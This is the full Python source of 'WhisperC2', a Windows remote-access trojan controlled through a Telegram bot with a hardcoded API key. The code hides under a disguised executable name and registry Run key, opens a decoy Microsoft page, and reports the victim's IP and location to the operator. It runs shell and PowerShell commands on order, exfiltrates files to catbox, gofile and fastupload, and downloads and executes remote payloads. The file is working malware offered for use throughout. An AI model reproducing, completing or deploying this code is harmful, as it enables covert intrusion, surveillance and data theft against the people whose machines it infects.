#!/usr/bin/env python3
from __future__ import annotations          # Python 3.7+
# =============================================================================
# WhisperC2 Professional – Mutex‑Hardened, Persistence‑Fixed, Triple‑Exfil
# Telemetry v4 Final – HTML‑escaped, crash‑log safe, zero‑waste imports
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
import shutil, winreg, ctypes, requests, re
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
OPERATOR_CHAT_ID = 5178265082
GROUP_CHAT_ID = -1003972714956
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Stealth‑renamed paths
# -----------------------------------------------------------------------------
PERSISTENT_NAME = "WinHostSvc.exe"
REGISTRY_VALUE  = "WinHostService"
MUTEX_NAME      = "Local\\WinHostSvc_Mutex"      # local namespace – no privilege needed

# -----------------------------------------------------------------------------
# Single‑instance mutex – local, always succeeds
# -----------------------------------------------------------------------------
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
if mutex == 0:
    sys.exit(1)
if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
    ctypes.windll.kernel32.CloseHandle(mutex)
    sys.exit(0)
atexit.register(ctypes.windll.kernel32.CloseHandle, mutex)

# -----------------------------------------------------------------------------
# Thread‑safe log buffer
# -----------------------------------------------------------------------------
log_lock = threading.Lock()
log_lines = []

def log(msg: str, level="INFO") -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        log_lines.append({"time": timestamp, "level": level, "msg": msg})
    print(f"[{level}] {msg}")

def log_error(msg): log(msg, "ERROR")
def log_success(msg): log(msg, "SUCCESS")
def log_warn(msg): log(msg, "WARN")

# -----------------------------------------------------------------------------
# Telegram bot
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)

# -----------------------------------------------------------------------------
# Agent identity & writable directory
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()
HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]

TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"
PID_FILE = Path(agents_dir) / "agent.pid"

# -----------------------------------------------------------------------------
# PID‑based override
# -----------------------------------------------------------------------------
def kill_old_instance():
    if PID_FILE.exists():
        try:
            old_pid = int(PID_FILE.read_text().strip())
            if old_pid == os.getpid():
                return
            handle = ctypes.windll.kernel32.OpenProcess(0x0001, False, old_pid)
            if handle:
                ctypes.windll.kernel32.TerminateProcess(handle, 0)
                ctypes.windll.kernel32.CloseHandle(handle)
                log_success(f"Killed old agent (PID {old_pid})")
                time.sleep(0.5)
        except:
            pass
        try:
            PID_FILE.unlink()
        except:
            pass

def save_pid():
    PID_FILE.write_text(str(os.getpid()))

def _safe_unlink(file_path: Path) -> None:
    try:
        if file_path.exists():
            file_path.unlink()
    except FileNotFoundError:
        pass

atexit.register(lambda: _safe_unlink(PID_FILE))

# -----------------------------------------------------------------------------
# Victim Geolocation (ip-api.com, free, no key, 45 req/min)
# -----------------------------------------------------------------------------
def get_geolocation() -> dict:
    """
    Returns a dict with location info or 'error' key on failure.
    Dict keys: ip, city, region, country, isp, lat, lon, map_link
    """
    try:
        resp = requests.get("http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,lat,lon,query", timeout=5)
        data = resp.json()
        if data.get("status") == "success":
            return {
                "ip": data["query"],
                "city": data["city"],
                "region": data["regionName"],
                "country": data["country"],
                "isp": data["isp"],
                "lat": data["lat"],
                "lon": data["lon"],
                "map_link": f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
            }
        else:
            return {"error": data.get("message", "Unknown error")}
    except Exception as e:
        return {"error": str(e)}

# -----------------------------------------------------------------------------
# HTML‑escape helper (prevent broken telemetry tables)
# -----------------------------------------------------------------------------
def _html_escape(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

# -----------------------------------------------------------------------------
# Enhanced HTML5 Telemetry (Capabilities + Location + Logs)
# -----------------------------------------------------------------------------
def generate_telemetry_report(status: str, topic_id, persist_ok, geo: dict) -> str:
    color = "#4CAF50" if status == "online" else "#F44336"
    emoji = "🟢" if status == "online" else "💀"
    title = f"{_html_escape(SYSTEM_ID)} – {status.upper()}"

    # Capabilities table
    persistence_status = "✅ Active" if persist_ok else "⚠️ Skipped/None"
    topic_status = f"✅ Topic {topic_id}" if topic_id else "⚠️ Fallback (group)"
    cap_rows = f"""
    <tr><td>Persistence</td><td style="color: {'#3fb950' if persist_ok else '#d29922'}">{persistence_status}</td></tr>
    <tr><td>Mutex</td><td style="color:#3fb950">✅ Held</td></tr>
    <tr><td>Topic</td><td style="color: {'#3fb950' if topic_id else '#d29922'}">{topic_status}</td></tr>
    <tr><td>/download limit</td><td>≤50 MB (Telegram) · 50‑200 MB (Catbox)</td></tr>
    <tr><td>/exfil limit</td><td>≤200 MB (Catbox) · ≤50 GB (Fastupload) · Unlimited (Gofile)</td></tr>
    """

    # Location section (values are safe, but we escape anyway for future‑proofing)
    if "error" not in geo:
        loc_rows = f"""
        <tr><td>Public IP</td><td>{_html_escape(geo['ip'])}</td></tr>
        <tr><td>City</td><td>{_html_escape(geo['city'])}</td></tr>
        <tr><td>Region</td><td>{_html_escape(geo['region'])}</td></tr>
        <tr><td>Country</td><td>{_html_escape(geo['country'])}</td></tr>
        <tr><td>ISP</td><td>{_html_escape(geo['isp'])}</td></tr>
        <tr><td>Lat/Lon</td><td>{geo['lat']}, {geo['lon']}</td></tr>
        <tr><td>Map</td><td><a href="{_html_escape(geo['map_link'])}" style="color:#58a6ff">Open in Google Maps</a></td></tr>
        """
    else:
        loc_rows = f"""<tr><td colspan="2" style="color:#f85149">⚠️ Location unavailable: {_html_escape(str(geo['error']))}</td></tr>"""

    # Log entries (last 30) – escape both time and message
    rows = ""
    with log_lock:
        for entry in log_lines[-30:]:
            level_color = {"INFO":"#58a6ff","WARN":"#d29922","ERROR":"#f85149","SUCCESS":"#3fb950"}.get(entry['level'], "#8b949e")
            safe_time = _html_escape(entry['time'])
            safe_msg = _html_escape(f"[{entry['level']}] {entry['msg']}")
            rows += f"<tr><td class=\"timestamp\">{safe_time}</td><td class=\"message\" style=\"color:{level_color}\">{safe_msg}</td></tr>"

    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{title}</title><style>
    *{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:2rem}}.report-card{{max-width:900px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5)}}.header{{background:{color};padding:2rem;text-align:center}}.header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}.header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}table{{width:100%;border-collapse:collapse}}th,td{{padding:.75rem 1rem;border-bottom:1px solid #21262d}}th{{text-align:left;background:#0d1117;color:#8b949e}}tr:hover{{background:#1c2128}}.capabilities{{margin-bottom:1.5rem}}.location{{margin-bottom:1.5rem}}h2{{color:#8b949e;font-size:1.1rem;margin:1.5rem 1rem 0.5rem}}</style></head><body><div class="report-card"><div class="header"><h1>{emoji} {title}</h1><div class="agent">{_html_escape(SYSTEM_ID)}</div></div><div class="body" style="padding:1.5rem">
    <h2>🛡️ Status & Capabilities</h2>
    <table class="capabilities">{cap_rows}</table>
    <h2>🌍 Location</h2>
    <table class="location">{loc_rows}</table>
    <h2>📜 Recent Events</h2>
    <table><thead><tr><th>Timestamp</th><th>Event</th></tr></thead><tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody></table></div></div></body></html>"""

def _sanitize_log_for_telegram(msg: str) -> str:
    return msg.replace('```', "'''")

def send_telemetry(topic_id, status: str, persist_ok: bool, geo: dict) -> bool:
    html_content = generate_telemetry_report(status, topic_id, persist_ok, geo)
    bio = io.BytesIO(html_content.encode('utf-8'))
    bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    if topic_id:
        try:
            bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
            log_success(f"Telemetry HTML sent to topic {topic_id} ({status})")
            return True
        except Exception as e:
            log_error(f"Telemetry HTML send to topic failed: {e}")
    bio.seek(0)
    try:
        bot.send_document(GROUP_CHAT_ID, bio)
        log_success(f"Telemetry HTML sent to main group ({status})")
        return True
    except Exception as e:
        log_error(f"Telemetry HTML to group failed: {e}")
    # Plain‑text fallback
    if "error" not in geo:
        loc_str = f"{geo['city']}, {geo['region']}, {geo['country']} (IP: {geo['ip']})"
    else:
        loc_str = f"Location unavailable"
    cap_summary = f"Persistence: {'Active' if persist_ok else 'None'} | Mutex: Held | Topic: {'Yes' if topic_id else 'Fallback'} | Download: ≤50MB TG, 50‑200MB Catbox | Exfil: Catbox ≤200MB, Fastupload ≤50GB, Gofile Unlimited"
    plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n📍 {loc_str}\n📊 {cap_summary}\n```\n" + "\n".join([f"[{x['level']}] {_sanitize_log_for_telegram(x['msg'])}" for x in log_lines[-10:]]) + "\n```"
    if len(plain) > 4000:
        plain = plain[:3997] + "…\n```"
    try:
        bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
        log_success(f"Telemetry plain text sent ({status})")
        return True
    except:
        return False

# -----------------------------------------------------------------------------
# Topic management
# -----------------------------------------------------------------------------
def load_topic_id() -> int | None:
    if TOPIC_ID_FILE.exists():
        try:
            return int(TOPIC_ID_FILE.read_text().strip())
        except:
            pass
    return None

def save_topic_id(tid: int) -> None:
    TOPIC_ID_FILE.write_text(str(tid))

def get_or_create_topic() -> int | None:
    existing = load_topic_id()
    if existing:
        try:
            test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
            try:
                bot.delete_message(GROUP_CHAT_ID, test.message_id)
            except Exception as del_err:
                log_warn(f"Could not delete test message: {del_err}")
            log_success(f"Reusing topic {existing}")
            return existing
        except Exception as e:
            log_error(f"Stored topic {existing} not accessible: {e}")
    try:
        new_topic = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0)
        tid = new_topic.message_thread_id
        save_topic_id(tid)
        log_success(f"Created topic {tid}")
        return tid
    except Exception as e:
        log_error(f"Topic creation failed: {e}")
        return None

# -----------------------------------------------------------------------------
# Persistence
# -----------------------------------------------------------------------------
def install_persistence() -> bool:
    if not getattr(sys, 'frozen', False):
        log_warn("Persistence skipped – script mode")
        return False
    try:
        dest_path = Path(agents_dir) / PERSISTENT_NAME
        current = Path(sys.executable)
        if current.resolve() != dest_path.resolve():
            if not dest_path.exists():
                shutil.copy2(current, dest_path)
                log_success(f"Copied to {dest_path}")
            else:
                try:
                    shutil.copy2(current, dest_path)
                    log_success(f"Overwritten {dest_path}")
                except PermissionError:
                    log_error("Cannot overwrite existing persistent file – persistence set to existing location only")
        else:
            log("Already running from persistent location")
        if dest_path.exists():
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r'Software\Microsoft\Windows\CurrentVersion\Run',
                                0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, REGISTRY_VALUE, 0, winreg.REG_SZ, str(dest_path))
            log_success("Persistence registry key set")
            return True
        else:
            log_error("Persistent file missing – cannot set registry")
            return False
    except Exception as e:
        log_error(f"Persistence error: {traceback.format_exc()}")
        return False

def self_destruct(topic_id) -> None:
    log("Self‑destruct sequence started")
    geo = get_geolocation()
    send_telemetry(topic_id, "offline", False, geo)
    try:
        persistent = Path(agents_dir) / PERSISTENT_NAME
        if persistent.exists():
            persistent.unlink()
            log_success("Persistent file deleted")
    except Exception as e:
        log_error(f"Failed to delete persistent file: {e}")
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            try:
                winreg.DeleteValue(key, REGISTRY_VALUE)
                log_success("Registry key removed")
            except FileNotFoundError:
                log("Registry key already absent")
    except Exception as e:
        log_error(f"Registry cleanup error: {e}")
    try:
        current = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__)
        if current.exists():
            ctypes.windll.kernel32.MoveFileExW(str(current), None, 0x4)
            log_success("Self‑deletion scheduled")
    except Exception as e:
        log_error(f"Self‑delete scheduling error: {e}")

# -----------------------------------------------------------------------------
# Command helpers
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    try:
        proc = subprocess.run(["cmd.exe", "/c", cmd], capture_output=True, text=True, encoding='utf-8', errors='replace', creationflags=0x08000000, timeout=30)
        out = (proc.stdout + proc.stderr).strip() or "[No output]"
        return out[:4000]
    except subprocess.TimeoutExpired:
        return "Timed out"
    except Exception as e:
        return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    try:
        proc = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, encoding='utf-8', errors='replace', creationflags=0x08000000, timeout=30)
        out = (proc.stdout + proc.stderr).strip() or "[No output]"
        return out[:4000]
    except subprocess.TimeoutExpired:
        return "Timed out"
    except Exception as e:
        return f"Error: {e}"

def view_file(path: str) -> str:
    try:
        if not os.path.exists(path): return "Not found"
        if os.path.isdir(path): return "Is a directory"
        if os.path.getsize(path) > 10*1024*1024: return "Too large"
        with open(path, 'r', errors='ignore') as f:
            return f.read()[:4000]
    except Exception as e:
        return f"Error: {e}"

def download_file_fs(path: str):
    try:
        if not os.path.exists(path): return None, "Not found"
        if os.path.isdir(path): return None, "Is a directory"
        if os.path.getsize(path) > 50*1024*1024: return None, "Too large for Telegram"
        return path, None
    except:
        return None, "Error"

# -----------------------------------------------------------------------------
# Exfiltration helpers
# -----------------------------------------------------------------------------
def upload_to_catbox(file_path: str) -> str | None:
    try:
        if not os.path.exists(file_path):
            log_error(f"Catbox upload: file not found: {file_path}")
            return None
        url = "https://catbox.moe/user/api.php"
        with open(file_path, 'rb') as f:
            files = {'fileToUpload': f}
            data = {'reqtype': 'fileupload', 'userhash': ''}
            r = requests.post(url, data=data, files=files, timeout=60)
        if r.status_code == 200 and r.text.startswith('http'):
            log_success(f"Catbox upload successful: {r.text.strip()}")
            return r.text.strip()
        else:
            log_error(f"Catbox upload failed: status={r.status_code}, response={r.text}")
            return None
    except Exception as e:
        log_error(f"Catbox upload exception: {e}")
        return None

def upload_to_gofile(file_path: str) -> str | None:
    try:
        if not os.path.exists(file_path):
            log_error(f"GoFile upload: file not found: {file_path}")
            return None
        server_resp = requests.get("https://api.gofile.io/servers", timeout=10)
        server_resp.raise_for_status()
        server_data = server_resp.json()
        if server_data.get("status") != "ok":
            log_error(f"GoFile: failed to get server: {server_data}")
            return None
        server = server_data["data"]["servers"][0]["name"]
        with open(file_path, 'rb') as f:
            upload_resp = requests.post(
                f"https://{server}.gofile.io/uploadFile",
                files={"file": f},
                timeout=120
            )
        upload_resp.raise_for_status()
        upload_data = upload_resp.json()
        if upload_data.get("status") != "ok":
            log_error(f"GoFile upload failed: {upload_data}")
            return None
        download_url = upload_data["data"]["downloadPage"]
        log_success(f"GoFile upload successful: {download_url}")
        return download_url
    except Exception as e:
        log_error(f"GoFile upload exception: {e}")
        return None

def upload_to_fastupload(file_path: str) -> str | None:
    try:
        if not os.path.exists(file_path):
            log_error(f"Fastupload upload: file not found: {file_path}")
            return None
        session = requests.Session()
        token = ""
        try:
            main_page = session.get("https://fastupload.io/", timeout=15)
            match = re.search(r'name="csrf-token"\s+content="([^"]+)"', main_page.text)
            if not match:
                match = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', main_page.text)
            if not match:
                csrf_resp = session.get("https://fastupload.io/csrf", timeout=10)
                if csrf_resp.status_code == 200:
                    try:
                        token = csrf_resp.json().get("token", "")
                    except:
                        pass
            if match:
                token = match.group(1)
        except:
            token = ""
        with open(file_path, 'rb') as f:
            files_payload = {"file": f}
            headers = {"X-CSRF-TOKEN": token} if token else {}
            upload_resp = session.post(
                "https://fastupload.io/upload",
                files=files_payload,
                headers=headers,
                timeout=120
            )
        if upload_resp.status_code != 200:
            log_error(f"Fastupload upload failed: status={upload_resp.status_code}")
            return None
        result = upload_resp.json()
        if "url" in result:
            download_url = result["url"]
            log_success(f"Fastupload upload successful: {download_url}")
            return download_url
        else:
            log_error(f"Fastupload upload failed: unexpected response {result}")
            return None
    except Exception as e:
        log_error(f"Fastupload upload exception: {e}")
        return None

def dex(arg_line: str):
    if not arg_line: return "Usage: dex <url> [args...]"
    parts = arg_line.split(maxsplit=1)
    url = parts[0]
    extra = parts[1].split() if len(parts) > 1 else []
    p = urlparse(url)
    if p.scheme not in ('http','https'): return "Invalid scheme"
    ext = os.path.splitext(p.path)[1] or ".exe"
    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + ext
    dest = os.path.join(os.environ.get('TEMP','.'), name)
    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for c in r.iter_content(8192):
                if c: f.write(c)
        log_success(f"Downloaded {os.path.getsize(dest)} bytes")
    except Exception as e:
        log_error(f"Download failed: {e}")
        return f"Download failed: {e}"
    try:
        proc = subprocess.Popen([dest, *extra], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=0x08000000)
        out, err = proc.communicate(timeout=30)
        output = (out + err).strip() or "[No output]"
        log_success(f"DEX exit {proc.returncode}")
        return f"Executed: {dest}\nExit: {proc.returncode}\n{output}"
    except Exception as e:
        log_error(f"DEX error: {e}")
        return f"Execution error: {e}"
    finally:
        try: ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
        except: pass

# -----------------------------------------------------------------------------
# Command dispatcher
# -----------------------------------------------------------------------------
def execute_command(cmd_line: str, topic_id):
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping","start","scan"):
        geo = get_geolocation()
        if "error" not in geo:
            loc = f"{geo['city']}, {geo['country']} ({geo['ip']})"
        else:
            loc = "Location unavailable"
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}\n📍 {loc}", None
    elif cmd == "shell":
        if not args: return "Usage: shell <command>", None
        return sys_cmd(args).replace('```',"'''"), None
    elif cmd in ("powershell","pow"):
        if not args: return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```',"'''"), None
    elif cmd in ("download","downloadfile"):
        file_path = args.strip()
        if not os.path.exists(file_path):
            return f"❌ Not found: {file_path}", None
        if os.path.isdir(file_path):
            return f"❌ Is a directory: {file_path}", None
        file_size = os.path.getsize(file_path)
        if file_size > 200 * 1024 * 1024:
            return f"❌ File too large for catbox (max 200 MB). Use /exfil for larger files.", None
        if file_size > 50 * 1024 * 1024:
            log(f"File {file_path} > 50 MB, uploading to catbox…")
            link = upload_to_catbox(file_path)
            if link:
                return f"⬆️ Uploaded to catbox:\n{link}", None
            else:
                return "❌ Catbox upload failed", None
        else:
            return f"⬆️ Uploading and deleting {file_path}", file_path
    elif cmd == "delete":
        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e: return f"❌ Delete failed: {e}", None
    elif cmd in ("view","viewfile"): return view_file(args.strip()).replace('```',"'''"), None
    elif cmd == "dex": return dex(args).replace('```',"'''"), None
    elif cmd == "exfil":
        if not args: return "Usage: exfil <file_path>", None
        file_path = args.strip()
        if not os.path.exists(file_path):
            return f"❌ Not found: {file_path}", None
        if os.path.isdir(file_path):
            return f"❌ Is a directory: {file_path}", None
        file_size = os.path.getsize(file_path)
        if file_size <= 200 * 1024 * 1024:
            log(f"Exfil via catbox (≤200 MB): {file_path}")
            link = upload_to_catbox(file_path)
        elif file_size <= 50 * 1024 * 1024 * 1024:
            log(f"Exfil via fastupload.io (≤50 GB): {file_path}")
            link = upload_to_fastupload(file_path)
        else:
            log(f"Exfil via gofile.io (Unlimited): {file_path}")
            link = upload_to_gofile(file_path)
        if link:
            return f"🔗 Exfil link:\n{link}", None
        else:
            return "❌ Exfil upload failed", None
    elif cmd == "die":
        self_destruct(topic_id)
        return "💀 Shutting down...", None
    elif cmd == "off":
        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
        return "🔌 Shutting down PC...", None
    else:
        return f"❓ Unknown: {cmd}", None

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
def main():
    try:
        log("Agent starting")
        kill_old_instance()
        save_pid()

        persist_ok = install_persistence()

        topic_id = None
        for attempt in range(3):
            topic_id = get_or_create_topic()
            if topic_id: break
            log_error(f"Topic attempt {attempt+1} failed, retrying…")
            time.sleep(2)

        if not topic_id:
            log_error("All topic attempts failed – falling back to main group")

        log(f"Operational: topic_id={topic_id}, persistence={persist_ok}")

        startup_geo = get_geolocation()

        def _handler_wrapper(message):
            if message.from_user.is_bot:
                return
            if message.from_user.id != OPERATOR_CHAT_ID:
                return
            if topic_id is not None:
                if getattr(message, 'message_thread_id', None) != topic_id:
                    return
            else:
                if not message.text or HOSTNAME_PREFIX not in message.text:
                    return
            text = (message.text or "").strip()
            if not text: return
            if text.startswith('/'): text = text[1:]
            if topic_id is None:
                text = text.replace(HOSTNAME_PREFIX, "", 1).strip()
            response, file_path = execute_command(text, topic_id)
            reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
            if text.lower().startswith("die"):
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
                sys.exit(0)
            try:
                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
            except:
                bot.reply_to(message, response, **reply_kwargs)
            if file_path and os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        bot.send_document(message.chat.id, f, message_thread_id=topic_id)
                    log_success(f"Sent and deleted: {file_path}")
                except Exception as e:
                    log_error(f"File send error: {e}")
                finally:
                    try: os.remove(file_path)
                    except: pass

        @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
        def _handler(msg):
            _handler_wrapper(msg)

        threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
        send_telemetry(topic_id, "online", persist_ok, startup_geo)
        log("Entering polling loop")
        bot.infinity_polling(timeout=30, long_polling_timeout=30)

    except Exception as fatal:
        # Always write crash log to our own writable directory
        crash_log = Path(agents_dir) / "whisper_error.log"
        try:
            with open(crash_log, "a") as f:
                f.write(f"[{datetime.now()}] FATAL: {traceback.format_exc()}\n")
        except:
            pass
        log_error(f"Fatal crash: {fatal}")
        try:
            bot.send_message(GROUP_CHAT_ID, f"🔥 **{SYSTEM_ID}** crashed:\n```{traceback.format_exc()}```")
        except:
            pass

if __name__ == "__main__":
    main()
